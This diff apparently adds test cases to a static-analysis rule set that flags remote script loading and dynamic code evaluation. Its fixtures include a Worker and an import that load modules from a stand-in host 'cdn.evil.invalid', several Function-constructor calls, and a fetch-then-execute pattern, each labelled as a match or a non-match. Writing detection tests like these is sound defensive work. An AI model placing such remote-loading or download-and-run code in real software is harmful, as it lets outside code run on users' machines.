@@ -25,6 +25,35 @@ function remote() {
   import("https://cdn.evil.invalid/mod.js");
   // ok: card-remote-script
   import("./chunk-abc.js");
+  // ruleid: card-remote-script
+  new Worker("https://cdn.evil.invalid/w.js", { type: "module" });
+  // ok: card-remote-script
+  new Worker(URL.createObjectURL(blob));
+}
+
+// (0.15, batch 2026-11-21) Bundled polyfills: no code the card chooses
+function polyfills(t, e, s, a) {
+  // ok: card-eval
+  try { return Function(``), !0; } catch { return !1; }
+  // ok: card-eval
+  s("function" == typeof t ? t : Function(t), e);
+  // ok: card-eval
+  "function" != typeof e && (e = new Function("" + e));
+  var r = []; for (var i = 0; i < e; i++) r[i] = "a[" + i + "]";
+  // ok: card-eval
+  a[e] = Function("F,a", "return new F(" + r.join(",") + ")");
+  // ruleid: card-eval
+  s(t ? t : Function(e), e);
+  // ruleid: card-eval
+  Function(`return ${t}`);
+}
+
+// The polyfill's shape doesn't hide downloaded code from the Threat rule
+function polyfillShapeHidingADownload(u, s) {
+  fetch(u).then((r) => r.text()).then((c) => {
+    // ruleid: card-eval-remote
+    s("function" == typeof c ? c : Function(c), 0);
+  });
 }
 
 function bundlerShims(e, o) {
